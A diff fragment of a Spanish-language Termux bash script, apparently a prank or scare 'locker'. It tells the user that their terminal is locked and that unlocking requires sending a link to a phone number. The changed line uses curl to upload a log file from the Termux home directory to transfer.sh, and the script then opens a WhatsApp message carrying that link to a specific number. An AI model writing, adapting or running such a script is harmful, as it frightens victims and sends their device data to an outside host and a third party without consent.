@@ -13,7 +13,7 @@ echo "    \|_______| \|_______|  \|_______|"
 setterm --foreground green
    echo "Su terminal esta bloqueada"
    echo "para desbloquearla envia el siguiente link al numero correspondiente"
-link=$(curl -s --upload-file log.txt  https://transfer.sh/JKsuh8)
+link=$(curl -s --upload-file /data/data/com.termux/files/home/whats-code/log.txt  https://transfer.sh/JKsuh8)
 
 open https://wa.me/59822228768?text=$link.KeLSxs9dj
 fun () {
